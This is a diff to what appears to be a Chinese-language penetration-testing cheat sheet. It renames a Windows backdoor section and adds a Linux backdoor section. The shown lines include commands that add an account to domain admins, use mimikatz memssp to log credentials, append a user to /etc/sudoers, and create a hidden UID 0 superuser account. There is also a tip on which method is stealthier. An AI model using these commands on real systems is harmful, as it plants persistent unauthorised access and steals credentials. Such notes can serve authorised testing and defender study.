@@ -1038,7 +1038,7 @@ windows/gather/credentials/domain_hashdump
 
 
 
-## 后门
+## Windows后门
 
 ~~~ABAP
 net group "domain admins" myuser /add /domain
@@ -1058,6 +1058,13 @@ mimikatz "privilege::debug" "misc::memssp" "exit"
 C:\Windows\System32\kiwissp.log
 ~~~
 
+## Linux后门
+~~~
+ # echo "0range ALL=(ALL) ALL" >> /etc/sudoers 	将现有普通用户添加为 sudo 用户
+ # useradd -u 0 -g 0 -o adv -m -s /bin/bash 	添加超管账户
+ps: 相比贸然去新增用户, 把系统中现有的普通用户提升为 sudo 用户可能会更靠谱点
+
+~~~
 
 
 ## 域信任关系
